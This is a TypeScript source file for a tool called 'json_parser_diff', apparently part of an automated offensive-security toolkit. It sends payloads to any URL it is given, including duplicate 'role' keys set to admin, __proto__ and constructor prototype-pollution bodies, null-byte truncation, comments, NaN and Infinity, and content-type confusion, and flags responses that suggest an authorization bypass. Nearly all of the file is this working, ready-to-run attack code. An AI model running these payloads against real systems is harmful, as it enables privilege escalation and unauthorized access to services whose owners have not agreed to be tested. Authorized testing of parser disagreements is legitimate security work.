// T33 — json_parser_diff
// Probes for JSON parser disagreement between layers.
// The classic: {"role":"user","role":"admin"} — Go takes first, JS takes last.
// If the auth gateway and business logic use different parsers, one admits
// the "user" claim while the other acts on "admin".

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'json_parser_diff',
  description:
    'Probe for JSON parser quirk exploitation. Fires duplicate keys, BOM prefix, BigInt ' +
    'literals, comments, trailing commas, NaN/Infinity, __proto__ injection, and null-byte ' +
    'truncation payloads. Detects auth bypass via first-vs-last duplicate-key semantics, ' +
    'prototype pollution sinks, and parser-specific parsing gaps.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',          type: 'string', required: true,  description: 'Target URL' },
    { name: 'method',       type: 'string', required: false, description: 'HTTP method', default: 'POST' },
    { name: 'base_body',    type: 'string', required: false, description: 'Base JSON body (string). Use INJECT as placeholder for the extra field injection point.' },
    { name: 'inject_field', type: 'string', required: false, description: 'Field name to duplicate/inject (default: role)', default: 'role' },
    { name: 'headers',      type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'timeout_ms',   type: 'number', required: false, description: 'Per-request timeout ms', default: 8000 },
  ],
};

function buildPayloads(field: string): Array<{ name: string; body: string; content_type: string }> {
  return [
    // Duplicate key attacks
    { name: 'dup_key_last_admin',    body: `{"${field}":"user","${field}":"admin"}`,               content_type: 'application/json' },
    { name: 'dup_key_first_admin',   body: `{"${field}":"admin","${field}":"user"}`,               content_type: 'application/json' },
    { name: 'dup_key_array',         body: `{"${field}":["user"],"${field}":"admin"}`,             content_type: 'application/json' },
    // Prototype pollution
    { name: 'proto_pollution',       body: `{"__proto__":{"isAdmin":true},"${field}":"user"}`,     content_type: 'application/json' },
    { name: 'constructor_pollution', body: `{"constructor":{"prototype":{"isAdmin":true}}}`,       content_type: 'application/json' },
    // BOM prefix
    { name: 'bom_prefix',            body: `﻿{"${field}":"admin"}`,                          content_type: 'application/json' },
    // Trailing comma (accepted by some parsers)
    { name: 'trailing_comma',        body: `{"${field}":"admin",}`,                               content_type: 'application/json' },
    // Comments (accepted by some parsers like JSONC, MongoDB)
    { name: 'line_comment',          body: `{"${field}":"admin"//comment\n}`,                     content_type: 'application/json' },
    { name: 'block_comment',         body: `{"${field}":"admin"/*comment*/}`,                     content_type: 'application/json' },
    // Special float values
    { name: 'nan_value',             body: `{"${field}":NaN}`,                                    content_type: 'application/json' },
    { name: 'infinity_value',        body: `{"${field}":Infinity}`,                               content_type: 'application/json' },
    // Null byte truncation
    { name: 'null_byte_truncation',  body: `{"${field}":"admin\x00user"}`,                        content_type: 'application/json' },
    // Type coercion attacks
    { name: 'number_as_bool',        body: `{"${field}":1}`,                                      content_type: 'application/json' },
    { name: 'empty_object_field',    body: `{"${field}":{}}`,                                     content_type: 'application/json' },
    { name: 'array_field',           body: `{"${field}":["admin","user"]}`,                       content_type: 'application/json' },
    // Content-type confusion
    { name: 'ct_form_encoded',       body: `${field}=admin`,                                      content_type: 'application/x-www-form-urlencoded' },
    { name: 'ct_text_plain',         body: `{"${field}":"admin"}`,                                content_type: 'text/plain' },
  ];
}

export const jsonParserDiffTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const method = String(params.method || 'POST').toUpperCase();
    const injectField = String(params.inject_field || 'role');
    const timeoutMs = Number(params.timeout_ms || 8000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };

    let extraHeaders: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    try { if (params.headers) Object.assign(extraHeaders, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    const payloads = buildPayloads(injectField);
    const results: Array<{ name: string; status: number; body_excerpt: string; time_ms: number; interesting?: boolean; error?: string }> = [];

    // Baseline: legitimate request
    let baselineStatus = 0;
    try {
      const r = await fetch(url, { method, headers: { ...extraHeaders, 'Content-Type': 'application/json' }, body: `{"${injectField}":"user"}` });
      baselineStatus = r.status;
    } catch { /* ignore */ }

    for (const payload of payloads) {
      const start = Date.now();
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const resp = await fetch(url, {
          method,
          headers: { ...extraHeaders, 'Content-Type': payload.content_type },
          body: payload.body,
          signal: controller.signal,
        });
        clearTimeout(timer);
        const text = await resp.text();
        const interesting = resp.status !== baselineStatus || text.toLowerCase().includes('admin') || text.toLowerCase().includes('privilege');
        results.push({ name: payload.name, status: resp.status, body_excerpt: text.substring(0, 80).replace(/\s+/g, ' '), time_ms: Date.now() - start, interesting });
      } catch (err) {
        results.push({ name: payload.name, status: 0, body_excerpt: '', time_ms: Date.now() - start, error: String(err) });
      }
    }

    const interesting = results.filter(r => r.interesting);
    const lines = [
      `json_parser_diff — ${payloads.length} payloads against ${url.substring(0, 80)}`,
      `Baseline status: ${baselineStatus}  |  Interesting results: ${interesting.length}/${results.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.interesting ? '⚡ INTERESTING' : (r.error ? '✗ ERR        ' : '  ·          ');
      lines.push(`  ${flag}  [${r.name.padEnd(28)}]  status=${r.status}  ${r.error ? `err=${r.error.substring(0, 40)}` : `body="${r.body_excerpt.substring(0, 60)}"`}`);
    }

    return {
      output: lines.join('\n'),
      parsed: { baseline_status: baselineStatus, total: results.length, interesting_count: interesting.length, interesting, results },
    };
  },
};
